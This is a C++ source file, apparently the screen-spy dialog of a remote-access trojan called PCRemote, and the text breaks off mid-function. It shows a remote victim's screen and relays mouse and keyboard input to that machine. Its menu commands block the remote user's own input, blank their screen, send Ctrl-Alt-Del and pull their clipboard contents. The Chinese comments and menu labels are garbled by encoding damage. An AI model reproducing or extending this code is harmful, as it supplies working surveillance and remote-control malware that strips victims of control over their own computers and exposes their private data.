// ScreenSpyDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"
#include "..\common\macros.h"
enum
{
	IDM_CONTROL = 0x0010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// ������ʾԶ�����
	IDM_BLOCK_INPUT,	// ����Զ�̼��������
	IDM_BLANK_SCREEN,	// ����
	IDM_CAPTURE_LAYER,	// ��׽��
	IDM_SAVEDIB,		// ����ͼƬ
	IDM_GET_CLIPBOARD,	// ��ȡ������
	IDM_SET_CLIPBOARD,	// ���ü�����
	IDM_ALGORITHM_SCAN,	// ����ɨ���㷨
	IDM_ALGORITHM_DIFF,	// ����Ƚ��㷨
	IDM_DEEP_1,			// ��Ļɫ�����.....
	IDM_DEEP_4_GRAY,
	IDM_DEEP_4_COLOR,
	IDM_DEEP_8_GRAY,
	IDM_DEEP_8_COLOR,
	IDM_DEEP_16,
	IDM_DEEP_32
};
// �����㷨
#define ALGORITHM_SCAN	1	// �ٶȺܿ죬����Ƭ̫��
#define ALGORITHM_DIFF	2	// �ٶȺ�����ҲռCPU������������������С��
// CScreenSpyDlg �Ի���

IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialogEx)

CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CScreenSpyDlg::IDD, pParent)
{
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_bIsFirst = true;
	m_lpScreenDIB = NULL;

	char szPath[MAX_PATH] = {0};
	GetSystemDirectory(szPath, MAX_PATH);
	lstrcat(szPath, "\\shell32.dll");
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szPath, 17);

	sockaddr_in sockAddr;
	ZeroMemory(&sockAddr, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	int Ret = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	m_IPAddress = (Ret != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";

	UINT nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	m_lpbmi = (BITMAPINFO*)new BYTE[nBISize];
	m_lpbmi_rect = (BITMAPINFO*)new BYTE[nBISize];

	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

	ZeroMemory(&m_MMI, sizeof(MINMAXINFO));

	m_bIsCtrl = false;		//Ĭ�ϲ�����
	m_nCount = 0;
	m_bCursorIndex = 1;
}

CScreenSpyDlg::~CScreenSpyDlg()
{
}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_WM_GETMINMAXINFO()
	ON_WM_HSCROLL()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
	ON_WM_VSCROLL()
END_MESSAGE_MAP()


// CScreenSpyDlg ��Ϣ�������


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	//��ʼ���˵�
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "������Ļ(&Y)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SEND_CTRL_ALT_DEL, "����Ctrl-Alt-Del(&K)");
		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "���ٷ�������(&T)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "������������ͼ���(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, "����˺���(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, "��׽��(���������˸)(&L)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "�������(&S)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "��ȡ������(&R)");
		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "���ü�����(&L)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_SCAN, "����ɨ���㷨(&S)");
		pSysMenu->AppendMenu(MF_STRING, IDM_ALGORITHM_DIFF, "����Ƚ��㷨(&X)");
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1, "1 λ�ڰ�(&A)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY, "4 λ�Ҷ�(&B)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, "4 λ��ɫ(&C)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY,  "8 λ�Ҷ�(&D)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, "8 λ��ɫ(&E)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_16, "16λ�߲�(&F)");
		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, "32λ���(&G)");		

		pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_SCAN, MF_BYCOMMAND);
		pSysMenu->CheckMenuRadioItem(IDM_DEEP_4_GRAY, IDM_DEEP_32, IDM_DEEP_8_COLOR, MF_BYCOMMAND);
	}

	// TODO: Add extra initialization here
	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight);
	SetWindowText(str);

	m_HScrollPos = 0;
	m_VScrollPos = 0;
	m_hRemoteCursor = LoadCursor(NULL, IDC_ARROW);

	ICONINFO CursorInfo;
	::GetIconInfo(m_hRemoteCursor, &CursorInfo);
	if (CursorInfo.hbmMask != NULL)
		::DeleteObject(CursorInfo.hbmMask);
	if (CursorInfo.hbmColor != NULL)
		::DeleteObject(CursorInfo.hbmColor);
	m_dwCursor_xHotspot = CursorInfo.xHotspot;
	m_dwCursor_yHotspot = CursorInfo.yHotspot;

	m_RemoteCursorPos.x = 0;
	m_RemoteCursorPos.x = 0;
	m_bIsTraceCursor = false;

	// ��ʼ�����ڴ�С�ṹ  ����ĳ�ʼ���Ͳ������ˣ�ͬ�����һ����λͼ��ͼ������
	//�����Ƿ���õĻ�����Ҳ����˵���ǿ��Ը����������������������ı�λͼͼ��
	m_hDC = ::GetDC(m_hWnd);
	m_hMemDC = CreateCompatibleDC(m_hDC);
	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
	SelectObject(m_hMemDC, m_hFullBitmap);
	SetScrollRange(SB_HORZ, 0, m_lpbmi->bmiHeader.biWidth);  
	SetScrollRange(SB_VERT, 0, m_lpbmi->bmiHeader.biHeight);

	InitMMI();
	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CScreenSpyDlg::InitMMI(void)
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);

	int	nBorderWidth = rectClient.left - rectWindow.left; // �߿��
	int	nTitleWidth = rectClient.top - rectWindow.top; // �������ĸ߶�

	int	nWidthAdd = nBorderWidth * 2 + GetSystemMetrics(SM_CYHSCROLL);
	int	nHeightAdd = nTitleWidth + nBorderWidth + GetSystemMetrics(SM_CYVSCROLL);
	int	nMinWidth = 400 + nWidthAdd;
	int	nMinHeight = 300 + nHeightAdd;
	int	nMaxWidth = m_lpbmi->bmiHeader.biWidth + nWidthAdd;
	int	nMaxHeight = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


	// ��С��Track�ߴ�
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;

	// ���ʱ���ڵ�λ��
	m_MMI.ptMaxPosition.x = 0;
	m_MMI.ptMaxPosition.y = 0;

	// �������ߴ�
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;

	// ����Track�ߴ�ҲҪ�ı�
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}


void CScreenSpyDlg::SendNext(void)
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}


void CScreenSpyDlg::OnClose()
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	m_pContext->m_Dialog[0] = 0;

	closesocket(m_pContext->m_Socket);

	::ReleaseDC(m_hWnd, m_hDC);
	DeleteObject(m_hFullBitmap);

	if (m_lpbmi)
		delete m_lpbmi;
	m_lpbmi=NULL;
	if (m_lpbmi_rect)
		delete m_lpbmi_rect;
	m_lpbmi_rect=NULL;
	SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_ARROW));

	m_bIsCtrl = false;
	CDialogEx::OnClose();
}


void CScreenSpyDlg::OnGetMinMaxInfo(MINMAXINFO* lpMMI)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	if(m_MMI.ptMaxSize.x > 0)
		memcpy(lpMMI, &m_MMI, sizeof(MINMAXINFO));
	CDialogEx::OnGetMinMaxInfo(lpMMI);
}


void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	SCROLLINFO si;
	int i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_HORZ, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return ;
	}

	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
	GetClientRect(&rect);

	if ((rect.right + i) > m_lpbmi->bmiHeader.biWidth)
		i = m_lpbmi->bmiHeader.biWidth - rect.right;

	InterlockedExchange((PLONG)&m_HScrollPos, i);

	SetScrollPos(SB_HORZ, m_HScrollPos);

	PostMessage(WM_PAINT);
	CDialogEx::OnHScroll(nSBCode, nPos, pScrollBar);
}


void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	SCROLLINFO si;
	int i;
	si.cbSize = sizeof(SCROLLINFO);
	si.fMask = SIF_ALL;
	GetScrollInfo(SB_VERT, &si);

	switch (nSBCode)
	{
	case SB_LINEUP:
		i = nPos - 1;
		break;
	case SB_LINEDOWN:
		i = nPos + 1;
		break;
	case SB_THUMBPOSITION:
	case SB_THUMBTRACK:
		i = si.nTrackPos;
		break;
	default:
		return ;
	}

	i = max(i, si.nMin);
	i = min(i, (int)(si.nMax - si.nPage + 1));

	RECT rect;
	GetClientRect(&rect);

	if ((rect.bottom + i) > m_lpbmi->bmiHeader.biHeight)
		i = m_lpbmi->bmiHeader.biHeight - rect.bottom;

	InterlockedExchange((PLONG)&m_VScrollPos, i);

	SetScrollPos(SB_VERT, m_VScrollPos);

	PostMessage(WM_PAINT);
	CDialogEx::OnVScroll(nSBCode, nPos, pScrollBar);
}


void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO: �ڴ˴������Ϣ����������
	// ��Ϊ��ͼ��Ϣ���� CDialogEx::OnPaint()
	if (m_bIsFirst)
	{
		DrawTipString("Please wait - initial screen loading");
		return;
	}
	//����ͬ�������ǽ�����api �����������ÿɲ�����������ץͼ������������ʾͼ��
	//Ϊʲô�أ�  ��Ϊץͼ����ʾͼ���������ǵ�Ƭ���뷨�����api�����þ��Ǹ���
	//�豸�Ļ��������������豸���������Ƶ����ǵ��ڴ滺�������������ץͼ��
	//���ڴ滺�������Ƶ��豸������������ʾͼ�ˡ���������������
	BitBlt
		(
		m_hDC,
		0,
		0,
		m_lpbmi->bmiHeader.biWidth, 
		m_lpbmi->bmiHeader.biHeight,
		m_hMemDC,
		m_HScrollPos,
		m_VScrollPos,
		SRCCOPY
		);

	// (BYTE)-1 = 255;
	// Draw the cursor
	//���ﻭһ������ͼ��
	if (m_bIsTraceCursor)
		DrawIconEx(
		m_hDC,									// handle to device context 
		m_RemoteCursorPos.x - ((int) m_dwCursor_xHotspot) - m_HScrollPos, 
		m_RemoteCursorPos.y - ((int) m_dwCursor_yHotspot) - m_VScrollPos,
		m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex),	// handle to icon to draw 
		0,0,										// width of the icon 
		0,											// index of frame in animated cursor 
		NULL,										// handle to background brush 
		DI_NORMAL | DI_COMPAT						// icon-drawing flags 
		);
}


void CScreenSpyDlg::DrawTipString(CString str)
{
	RECT rect;
	GetClientRect(&rect);
	COLORREF bgcol = RGB(0x00, 0x00, 0x00);	
	COLORREF oldbgcol  = SetBkColor(m_hDC, bgcol);
	COLORREF oldtxtcol = SetTextColor(m_hDC, RGB(0xff,0x00,0x00));
	ExtTextOut(m_hDC, 0, 0, ETO_OPAQUE, &rect, NULL, 0, NULL);

	DrawText (m_hDC, str, -1, &rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hDC, oldbgcol);
	SetTextColor(m_hDC, oldtxtcol);
}


void CScreenSpyDlg::OnReceiveComplete(void)
{
	m_nCount++;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FIRSTSCREEN:
		DrawFirstScreen();            //������ʾ��һ֡ͼ�� һ��ת����������
		break;
	case TOKEN_NEXTSCREEN:
		if (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1] == ALGORITHM_SCAN)
			DrawNextScreenRect();     //�����ǵڶ�֮֡���������---
		else
			DrawNextScreenDiff();     //----��Ȼ�����������㷨 
		break;                         //������ת��DrawFirstScreen��������
	case TOKEN_BITMAPINFO:
		ResetScreen();
		break;
	case TOKEN_CLIPBOARD_TEXT:
		UpdateLocalClipboard((char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		break;
	default:
		// ���䷢���쳣����
		return;
	}
}


void CScreenSpyDlg::DrawFirstScreen(void)
{
	m_bIsFirst = false;
	//����Ҳ�ܼ򵥾��ǵõ�����˷��������� ������������HBITMAP�Ļ������У�����һ��ͼ��ͳ�����
	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_lpbmi->bmiHeader.biSizeImage);
	//���ǵ�OnPaint()����
	//OnPaint();
	PostMessage(WM_PAINT);
}


void CScreenSpyDlg::DrawNextScreenDiff(void)
{
	//�������Ҳ�ǳ����� ��������ֱ�ӻ�����Ļ�ϣ����Ǹ���һ�±仯���ֵ���Ļ����Ȼ�����
	//OnPaint����ȥ
	// ��������Ƿ��ƶ�����Ļ�Ƿ�仯�ж��Ƿ��ػ���꣬��ֹ�����˸
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ��ʶ + �㷨 + ���λ�� + �����������
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	POINT	oldPoint;
	memcpy(&oldPoint, &m_RemoteCursorPos, sizeof(POINT));
	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));

	// ����ƶ���
	if (memcmp(&oldPoint, &m_RemoteCursorPos, sizeof(POINT)) != 0)
		bIsReDraw = true;

	// ������ͷ����仯
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// ��Ļ�Ƿ�仯
	if (dwBytes > 0) 
		bIsReDraw = true;

	__asm
	{
		mov ebx, [dwBytes]
		mov esi, [lpNextScreen]
		jmp	CopyEnd
CopyNextBlock:
		mov edi, [lpFirstScreen]
		lodsd	// ��lpNextScreen�ĵ�һ��˫�ֽڣ��ŵ�eax��,����DIB�иı������ƫ��
			add edi, eax	// lpFirstScreenƫ��eax	
			lodsd // ��lpNextScreen����һ��˫�ֽڣ��ŵ�eax��, ���Ǹı�����Ĵ�С
			mov ecx, eax
			sub ebx, 8 // ebx ��ȥ ����dword
			sub ebx, ecx // ebx ��ȥDIB���ݵĴ�С
			rep movsb
CopyEnd:
		cmp ebx, 0 // �Ƿ�д�����
			jnz CopyNextBlock
	}

	if (bIsReDraw) PostMessage(WM_PAINT);;
}


void CScreenSpyDlg::DrawNextScreenRect(void)
{
	//�������Ҳ�ǳ��������������������� �õ��仯������Ȼ�󻭵���Ļ��

	// ��������Ƿ��ƶ�������Ƿ��ڱ仯�������ж��Ƿ��ػ���꣬��ֹ�����˸
	bool	bIsReDraw = false;
	int		nHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ��ʶ + �㷨 + ���λ�� + �����������
	LPVOID	lpFirstScreen = m_lpScreenDIB;
	LPVOID	lpNextScreen = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);
	DWORD	dwBytes = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;


	// �����ϴ�������ڵ�λ��
	RECT	rectOldPoint;
	::SetRect(&rectOldPoint, m_RemoteCursorPos.x, m_RemoteCursorPos.y, 
		m_RemoteCursorPos.x + m_dwCursor_xHotspot, m_RemoteCursorPos.y + m_dwCursor_yHotspot);

	memcpy(&m_RemoteCursorPos, m_pContext->m_DeCompressionBuffer.GetBuffer(2), sizeof(POINT));

	//////////////////////////////////////////////////////////////////////////
	// �ж�����Ƿ��ƶ�
	if ((rectOldPoint.left != m_RemoteCursorPos.x) || (rectOldPoint.top != 
		m_RemoteCursorPos.y))
		bIsReDraw = true;

	// ������ͷ����仯
	int	nOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_pContext->m_DeCompressionBuffer.GetBuffer(10)[0];
	if (nOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
	}

	// �ж�������������Ƿ����仯
	DWORD	dwOffset = 0;
	while (dwOffset < dwBytes && !bIsReDraw)
	{
		LPRECT	lpRect = (LPRECT)((LPBYTE)lpNextScreen + dwOffset);
		RECT rectDest;		
		if (IntersectRect(&rectDest, &rectOldPoint, lpRect))
			bIsReDraw = true;
		dwOffset += sizeof(RECT) + m_lpbmi_rect->bmiHeader.biSizeImage;
	}
	bIsReDraw = bIsReDraw && m_bIsTraceCursor;
	//////////////////////////////////////////////////////////////////////////

	dwOffset = 0;
	while (dwOffset < dwBytes)
	{
		LPRECT	lpRect = (LPRECT)((LPBYTE)lpNextScreen + dwOffset);
		int	nRectWidth = lpRect->right - lpRect->left;
		int	nRectHeight = lpRect->bottom - lpRect->top;

		m_lpbmi_rect->bmiHeader.biWidth = nRectWidth;
		m_lpbmi_rect->bmiHeader.biHeight = nRectHeight;
		m_lpbmi_rect->bmiHeader.biSizeImage = (((m_lpbmi_rect->bmiHeader.biWidth * m_lpbmi_rect->bmiHeader.biBitCount + 31) & ~31) >> 3) 
			* m_lpbmi_rect->bmiHeader.biHeight;

		StretchDIBits(m_hMemDC, lpRect->left, lpRect->top, nRectWidth,
			nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
			m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);

		// ����Ҫ�ػ����Ļ���ֱ���ػ�仯�Ĳ���
		if (!bIsReDraw)
			StretchDIBits(m_hDC, lpRect->left - m_HScrollPos, lpRect->top - m_VScrollPos, nRectWidth,
			nRectHeight, 0, 0, nRectWidth, nRectHeight, (LPBYTE)lpNextScreen + dwOffset + sizeof(RECT),
			m_lpbmi_rect, DIB_RGB_COLORS, SRCCOPY);

		dwOffset += sizeof(RECT) + m_lpbmi_rect->bmiHeader.biSizeImage;
	}

	if (bIsReDraw) PostMessage(WM_PAINT);;	
}


void CScreenSpyDlg::ResetScreen(void)
{
	UINT	nBISize = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	if (m_lpbmi != NULL)
	{
		int	nOldWidth = m_lpbmi->bmiHeader.biWidth;
		int	nOldHeight = m_lpbmi->bmiHeader.biHeight;

		delete[] m_lpbmi;
		delete[] m_lpbmi_rect;

		m_lpbmi = (BITMAPINFO *) new BYTE[nBISize];
		m_lpbmi_rect = (BITMAPINFO *) new BYTE[nBISize];

		memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
		memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);

		DeleteObject(m_hFullBitmap);
		m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
		SelectObject(m_hMemDC, m_hFullBitmap);

		memset(&m_MMI, 0, sizeof(MINMAXINFO));
		InitMMI();

		// �ֱ��ʷ����ı�
		if (nOldWidth != m_lpbmi->bmiHeader.biWidth || nOldHeight != m_lpbmi->bmiHeader.biHeight)
		{
			RECT	rectClient, rectWindow;
			GetWindowRect(&rectWindow);
			GetClientRect(&rectClient);
			ClientToScreen(&rectClient);

			// ����ClientRect��WindowRect�Ĳ�ࣨ����������������
			rectWindow.right = m_lpbmi->bmiHeader.biWidth +  rectClient.left + (rectWindow.right - rectClient.right);
			rectWindow.bottom = m_lpbmi->bmiHeader.biHeight + rectClient.top + (rectWindow.bottom - rectClient.bottom);
			MoveWindow(&rectWindow);
		}
	}	
}


void CScreenSpyDlg::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GPTR, len);
	if (hglbCopy != NULL) { 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l)

	CRect rect;
	GetClientRect(&rect);

	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
			msg.pt.x += m_HScrollPos;
			msg.pt.y += m_VScrollPos;
			SendCommand(&msg);
		}
		break;
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	msg;
			memcpy(&msg, pMsg, sizeof(MSG));
			msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_VScrollPos, LOWORD(pMsg->lParam) + m_HScrollPos);
			msg.pt.x += m_HScrollPos;
			msg.pt.y += m_VScrollPos;
			SendCommand(&msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	default:
		break;
	}
	return CDialogEx::PreTranslateMessage(pMsg);
}


void CScreenSpyDlg::SendCommand(MSG* pMsg)
{
	if (!m_bIsCtrl)
		return;

	LPBYTE lpData = new BYTE[sizeof(MSG) + 1];
	lpData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(lpData + 1, pMsg, sizeof(MSG));
	m_iocpServer->Send(m_pContext, lpData, sizeof(MSG) + 1);

	delete[] lpData;
}

void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ
	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			pSysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);

			if (m_bIsCtrl)
			{
				if (m_bIsTraceCursor)
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
				else
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
			}
			else
				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
		}
		break;
	case IDM_SEND_CTRL_ALT_DEL:
		{
			BYTE	bToken = COMMAND_SCREEN_CTRL_ALT_DEL;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		}
		break;
	case IDM_TRACE_CURSOR: // ���ٷ�������
		{	
			m_bIsTraceCursor = !m_bIsTraceCursor;	
			pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
			if (m_bIsCtrl)
			{
				if (!m_bIsTraceCursor)
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);
				else
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
			}
			// �ػ���������ʾ���
			OnPaint();
		}
		break;
	case IDM_BLOCK_INPUT: // ������������ͼ���
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
		}
		break;
	case IDM_BLANK_SCREEN: // ����˺���
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLANK;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
		}
		break;
	case IDM_CAPTURE_LAYER: // ��׽��
		{
			bool bIsChecked = pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED;
			pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_CAPTURE_LAYER;
			bToken[1] = !bIsChecked;
			m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));			
		}
		break;
	case IDM_SAVEDIB:
		SaveSnapshot();
		break;
	case IDM_GET_CLIPBOARD: // ��ȡ������
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
		}
		break;
	case IDM_SET_CLIPBOARD: // ���ü�����
		{
			SendLocalClipboard();
		}
		break;
	case IDM_ALGORITHM_SCAN: // ����ɨ���㷨
		{
			SendResetAlgorithm(ALGORITHM_SCAN);
			pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_SCAN, MF_BYCOMMAND);
		}
		break;
	case IDM_ALGORITHM_DIFF: // ����Ƚ��㷨
		{
			SendResetAlgorithm(ALGORITHM_DIFF);
			pSysMenu->CheckMenuRadioItem(IDM_ALGORITHM_SCAN, IDM_ALGORITHM_DIFF, IDM_ALGORITHM_DIFF, MF_BYCOMMAND);
		}
		break;
	case IDM_DEEP_1:
		{
